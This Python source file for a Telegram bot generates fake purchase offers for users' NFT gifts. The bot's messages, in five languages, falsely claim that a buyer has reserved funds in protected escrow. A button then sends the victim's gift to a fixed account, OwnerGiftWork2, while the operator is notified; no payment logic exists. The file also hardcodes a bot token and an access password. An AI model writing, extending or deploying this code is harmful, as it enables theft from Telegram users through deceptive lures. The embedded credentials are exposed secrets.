import asyncio
import logging
import os
import random
import re
import sqlite3
from urllib.parse import urlparse

from aiogram import Bot, Dispatcher, types, F
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    LinkPreviewOptions,
    InlineQueryResultArticle, InputTextMessageContent
)
from aiogram.exceptions import TelegramBadRequest

# --- ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ---
_active_offers = {}

BOT_TOKEN = os.getenv("BOT_TOKEN", "9220492113:AAGJ6x_6DD2mWclLCbx_2ts59AIh4I4EWqI")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8879475292"))
ADMIN_IDS = [ADMIN_ID] 

SECRET_PASSWORD = "1488228"

CHANNEL_ID = -1004386720015 
CHANNEL_LINK = "https://t.me/asfasfasffsdag"

# Точные кастомные ID эмодзи для кнопок
EMOJI_ACCEPT = "5774022692642492953"
EMOJI_DECLINE = "5774077015388852135"
EMOJI_GIFT = "5773677501825945508"
EMOJI_HOW = "6030848053177486888"

# Точные кастомные ID эмодзи для валют
EMOJI_GRAM = "💎"
EMOJI_STAR = "⭐"
EMOJI_USDT = "💵"

bot = Bot(BOT_TOKEN)
dp = Dispatcher()
log = logging.getLogger("inline_offer")

# --- БАЗА ДАННЫХ ---
conn = sqlite3.connect("bot_data.db", check_same_thread=False)
cur = conn.cursor()
cur.execute("""
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, 
        is_allowed INTEGER DEFAULT 0,
        offers_used INTEGER DEFAULT 0
    )
""")
try:
    cur.execute("ALTER TABLE users ADD COLUMN is_allowed INTEGER DEFAULT 0")
except sqlite3.OperationalError:
    pass
conn.commit()

def is_user_allowed(user_id: int) -> bool:
    if user_id in ADMIN_IDS:
        return True
    cur.execute("SELECT is_allowed FROM users WHERE user_id = ?", (user_id,))
    row = cur.fetchone()
    return bool(row and row[0] == 1)

def allow_user(user_id: int):
    cur.execute("INSERT INTO users (user_id, is_allowed) VALUES (?, 1) ON CONFLICT(user_id) DO UPDATE SET is_allowed = 1", (user_id,))
    conn.commit()

# --- ПАРСИНГ И ЯЗЫКИ ---
def normalize_nft_url(raw: str) -> str | None:
    s = raw.strip()
    if not s: return None
    if s.startswith("t.me/"): s = "https://" + s
    if not s.startswith("http"):
        if s.startswith("nft/") or "/nft/" in s: s = "https://t.me/" + s.lstrip("/")
        else: return None
    parsed = urlparse(s)
    if parsed.netloc not in ("t.me", "telegram.me", "www.t.me"): return None
    if "/nft/" not in parsed.path: return None
    return f"https://t.me{parsed.path}".rstrip("/")

def nft_title_from_url(nft_url: str) -> str:
    slug = nft_url.rstrip("/").split("/")[-1]
    if "-" in slug:
        name_part, num = slug.rsplit("-", 1)
        spaced = re.sub(r"([a-z])([A-Z])", r"\1 \2", name_part).replace("_", " ")
        if num.isdigit(): return f"{spaced} #{num}"
    return slug.replace("-", " ").replace("_", " ")

TRANSLATIONS = {
    "ru": {
        "offer": "предлагает Вам",
        "time": "Предложение действует ещё 5 ч. 59 мин.",
        "escrow": "Покупатель зарезервировал <b>{amount}</b>{currency}, средства защищены и будут автоматически зачислены на ваш баланс сразу после передачи подарка.",
        "item_lbl": "Подарок:",
        "amount_lbl": "Сумма к получению:",
        "btn_transfer": "Передать подарок",
        "btn_how": "Как передать?"
    },
    "en": {
        "offer": "offers you",
        "time": "Offer valid for another 5h 59m",
        "escrow": "The buyer has reserved <b>{amount}</b>{currency}, funds are protected and will be automatically credited to your balance immediately after transferring the gift.",
        "item_lbl": "Gift:",
        "amount_lbl": "Amount to receive:",
        "btn_transfer": "Transfer gift",
        "btn_how": "How to transfer?"
    },
    "ua": {
        "offer": "пропонує Вам",
        "time": "Пропозиція діє ще 5 год. 59 хв.",
        "escrow": "Покупець зарезервував <b>{amount}</b>{currency}, кошти захищені та будуть автоматично зараховані на ваш баланс одразу після передачі подарунка.",
        "item_lbl": "Подарунок:",
        "amount_lbl": "Сума до отримання:",
        "btn_transfer": "Передати подарунок",
        "btn_how": "Як передати?"
    },
    "ar": {
        "offer": "يعرض عليك",
        "time": "العرض ساري لمدة 5 ساعات و 59 دقيقة أخرى",
        "escrow": "قام المشتري بحجز <b>{amount}</b>{currency}، الأموال محمية وسيتم إضافتها تلقائيًا إلى رصيدك فور تسليم الهدية.",
        "item_lbl": "الهدية:",
        "amount_lbl": "المبلغ المراد استлаمه:",
        "btn_transfer": "تسليم الهدية",
        "btn_how": "كيفية التسليم؟"
    },
    "cn": {
        "offer": "向您出价",
        "time": "优惠有效时间还有 5 小时 59 分钟",
        "escrow": "买家已预订 <b>{amount}</b>{currency}，资金受到保护，赠送礼物后将立即自动存入您的账户。",
        "item_lbl": "礼物：",
        "amount_lbl": "接收金额：",
        "btn_transfer": "赠送礼物",
        "btn_how": "如何赠送？"
    }
}

def parse_inline_query(query_text: str):
    parts = query_text.strip().split()
    if len(parts) < 3:
        return None
        
    lang = "ru"
    if parts[0].lower() in TRANSLATIONS:
        lang = parts[0].lower()
        parts = parts[1:]
        
    url_index = -1
    for i, part in enumerate(parts):
        if "t.me/" in part or "nft/" in part or "http" in part:
            url_index = i
            break
            
    if url_index == -1:
        return None
        
    nft_url = normalize_nft_url(parts[url_index])
    if not nft_url:
        return None
        
    after_url = parts[url_index + 1:]
    if not after_url:
        return None
        
    amount = after_url[0]
    currency = "stars"
    if len(after_url) > 1:
        currency = after_url[1].lower()
        
    cur_symbols = {
        "stars": f" {EMOJI_STAR}", "star": f" {EMOJI_STAR}", "звезд": f" {EMOJI_STAR}", "звезды": f" {EMOJI_STAR}",
        "грам": f" {EMOJI_GRAM}", "gram": f" {EMOJI_GRAM}", "grams": f" {EMOJI_GRAM}", "ton": f" {EMOJI_GRAM}",
        "usdt": f" USDT {EMOJI_USDT}", "доллар": f" USDT {EMOJI_USDT}", "$": f" USDT {EMOJI_USDT}"
    }
    currency_symbol = cur_symbols.get(currency, f" {currency.upper()}")
    
    return lang, amount, currency_symbol, nft_url

def build_offer_text(user_name: str, lang: str, amount: str, currency: str, nft_url: str, nft_title: str) -> str:
    t = TRANSLATIONS.get(lang, TRANSLATIONS["ru"])
    if lang == "cn":
        return (
            f"用户 <b>{user_name}</b> {t['offer']} "
            f"<b>{amount}</b>{currency} "
            f'购买收藏品 <a href="{nft_url}">{nft_title}</a>。\n\n'
            f"{t['time']}.."
        )
    else:
        return (
            f"Пользователь <b>{user_name}</b> {t['offer']} "
            f"<b>{amount}</b>{currency} за "
            f'коллекционный предмет <a href="{nft_url}">{nft_title}</a>.\n\n'
            f"{t['time']}.."
        )

def build_keyboard() -> InlineKeyboardMarkup:
    try:
        decline_btn = InlineKeyboardButton(text="Отклонить", callback_data="decline_offer", icon_custom_emoji_id=EMOJI_DECLINE)
        accept_btn = InlineKeyboardButton(text="Принять", callback_data="accept_offer", icon_custom_emoji_id=EMOJI_ACCEPT)
    except TypeError:
        decline_btn = InlineKeyboardButton(text="Отклонить", callback_data="decline_offer")
        accept_btn = InlineKeyboardButton(text="Принять", callback_data="accept_offer")
    return InlineKeyboardMarkup(inline_keyboard=[[decline_btn, accept_btn]])

# --- ИНЛАЙН ОБРАБОТЧИК С ПРОВЕРКОЙ ДОСТУПА ---
@dp.inline_query()
async def inline_offer_handler(inline_query: types.InlineQuery):
    user_id = inline_query.from_user.id
    
    if not is_user_allowed(user_id):
        results = [
            InlineQueryResultArticle(
                id="access_denied",
                title="🔒 Доступ ограничен",
                description="У вас нет прав. Введите /pass в ЛС боту.",
                input_message_content=InputTextMessageContent(
                    message_text="❌ <b>У вас нет доступа к созданию офферов.</b>\n\nПерейдите в личные сообщения с ботом и введите команду: <code>/pass 1488228</code>",
                    parse_mode="HTML"
                )
            )
        ]
        await inline_query.answer(results, cache_time=1)
        return

    query_text = inline_query.query.strip()
    user_name = inline_query.from_user.first_name if inline_query.from_user else "Пользователь"

    parsed = parse_inline_query(query_text)
    if not parsed:
        results = [
            InlineQueryResultArticle(
                id="help_hint",
                title="🎁 Создание оффера через @ITelegram_GiftBot",
                description="Формат: <язык> <ссылка> <сумма> <валюта>\nПример: ua https://t.me/nft/MythMask-163737 3233 stars",
                input_message_content=InputTextMessageContent(
                    message_text="ℹ️ <b>Инструкция по использованию инлайн-оффера:</b>\n\nНапишите в любом чате:\n<code>@ITelegram_GiftBot ua https://t.me/nft/MythMask-163737 3233 stars</code>",
                    parse_mode="HTML"
                )
            )
        ]
        await inline_query.answer(results, cache_time=1)
        return

    lang, amount, currency, nft_url = parsed
    nft_title = nft_title_from_url(nft_url)
    
    text = build_offer_text(user_name, lang, amount, currency, nft_url, nft_title)
    keyboard = build_keyboard()

    offer_key = str(random.randint(10000, 99999))
    _active_offers[offer_key] = {
        "nft_url": nft_url,
        "nft_title": nft_title,
        "amount": amount,
        "currency": currency,
        "user_name": user_name,
        "lang": lang
    }

    results = [
        InlineQueryResultArticle(
            id=offer_key,
            title=f"📦 Оффер: {amount}{currency} за {nft_title}",
            description=f"Язык: {lang.upper()} | Нажмите для отправки карточки",
            input_message_content=InputTextMessageContent(
                message_text=text,
                parse_mode="HTML",
                link_preview_options=LinkPreviewOptions(
                    is_disabled=False, 
                    prefer_large_media=True, 
                    show_above_text=True, 
                    url=nft_url
                )
            ),
            reply_markup=keyboard
        )
    ]
    await inline_query.answer(results, cache_time=1, is_personal=True)

@dp.chosen_inline_result()
async def on_chosen_inline(chosen_result: types.ChosenInlineResult):
    log.info(f"[INLINE] Пользователь {chosen_result.from_user.id} успешно отправил оффер")

@dp.message(F.text & F.text.startswith("/pass"))
async def cmd_pass(message: types.Message):
    args = message.text.split()
    if len(args) < 2 or args[1] != SECRET_PASSWORD:
        await message.answer("❌ Неверный пароль.")
        return
        
    allow_user(message.from_user.id)
    await message.answer(
        "✅ <b>Доступ успешно активирован!</b>\n\n"
        "Теперь вы можете создавать инлайн-офферы в любых чатах:\n"
        "<code>@ITelegram_GiftBot ua https://t.me/nft/Item 500 stars</code>",
        parse_mode="HTML"
    )

@dp.message(F.text & (F.text.lower() == "/start" or F.text.lower() == "/help"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    if is_user_allowed(user_id):
        status_text = "🟢 <b>Статус:</b> Доступ активен."
    else:
        status_text = "🔴 <b>Статус:</b> Доступ ограничен. Введите команду /pass с паролем для активации."

    await message.answer(
        f"🌲 <b>Eclipse Offer Inline Bot (@ITelegram_GiftBot)</b>\n\n"
        f"{status_text}\n\n"
        "Инструкция по созданию оффера:\n"
        "<code>@ITelegram_GiftBot ua https://t.me/nft/Item-123 500 stars</code>",
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "accept_offer")
async def process_accept(callback: types.CallbackQuery):
    acceptor_name = callback.from_user.first_name if callback.from_user else "Пользователь"
    acceptor_id = callback.from_user.id if callback.from_user else 0
    
    try:
        await bot.send_message(
            ADMIN_ID, 
            f"🔔 Пользователь «{acceptor_name}» ({acceptor_id}) принял оффер!"
        )
    except Exception:
        pass

    nft_url = "https://t.me/nft/MythMask-163737"
    nft_title = "Myth Mask #163737"
    amount = "3233"
    currency = f" {EMOJI_STAR}"
    lang = "ru"
    
    if _active_offers:
        last_data = list(_active_offers.values())[-1]
        nft_url = last_data["nft_url"]
        nft_title = last_data["nft_title"]
        amount = last_data["amount"]
        currency = last_data["currency"]
        lang = last_data.get("lang", "ru")

    t = TRANSLATIONS.get(lang, TRANSLATIONS["ru"])
    send_url = "tg://send_gift?to=OwnerGiftWork2"

    escrow_text = t['escrow'].format(amount=amount, currency=currency)

    accepted_text = (
        f"{escrow_text}\n\n"
        f"{t['item_lbl']} <a href=\"{nft_url}\">{nft_title}</a>\n"
        f"{t['amount_lbl']} <b>{amount}</b>{currency}"
    )
    
    try:
        transfer_btn = InlineKeyboardButton(text=t['btn_transfer'], url=send_url, icon_custom_emoji_id=EMOJI_GIFT)
        how_btn = InlineKeyboardButton(text=t['btn_how'], callback_data="how_to_transfer", icon_custom_emoji_id=EMOJI_HOW)
    except TypeError:
        transfer_btn = InlineKeyboardButton(text=t['btn_transfer'], url=send_url)
        how_btn = InlineKeyboardButton(text=t['btn_how'], callback_data="how_to_transfer")

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [transfer_btn],
        [how_btn]
    ])

    try:
        await callback.answer()
    except TelegramBadRequest:
        pass

    try:
        preview_opts = LinkPreviewOptions(
            is_disabled=False, 
            prefer_large_media=True, 
            show_above_text=True, 
            url=nft_url
        )
        if callback.inline_message_id:
            await bot.edit_message_text(
                inline_message_id=callback.inline_message_id,
                text=accepted_text,
                reply_markup=kb,
                parse_mode="HTML",
                link_preview_options=preview_opts
            )
        elif callback.message:
            await callback.message.edit_text(
                text=accepted_text,
                reply_markup=kb,
                parse_mode="HTML",
                link_preview_options=preview_opts
            )
    except Exception as e:
        log.error(f"Ошибка обновления карточки: {e}")

@dp.callback_query(F.data == "how_to_transfer")
async def process_how_to(callback: types.CallbackQuery):
    guide_text = (
        "1. Нажмите «Передать подарок» под сообщением.\n\n"
        "2. Перейдите в «Мои подарки» и выберите NFT.\n\n"
        "3. Нажмите «Передать», выберите аккаунт покупателя и передайте подарок."
    )
    try:
        await callback.answer(guide_text, show_alert=True)
    except TelegramBadRequest:
        pass

@dp.callback_query(F.data == "decline_offer")
async def process_decline(callback: types.CallbackQuery):
    try:
        await callback.answer("Вы отклонили предложение.", show_alert=False)
    except TelegramBadRequest:
        pass
    
    try:
        if callback.inline_message_id:
            await bot.edit_message_text(
                inline_message_id=callback.inline_message_id,
                text="❌ Вы отклонили предложение.",
                reply_markup=None
            )
        elif callback.message:
            await callback.message.edit_text(text="❌ Вы отклонили предложение.", reply_markup=None)
    except Exception:
        pass

async def main():
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s: %(message)s")
    print("Идеальный премиальный бот запущен и работает!")
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot, allowed_updates=["message", "inline_query", "chosen_inline_result", "callback_query"])

if __name__ == "__main__":
    asyncio.run(main())
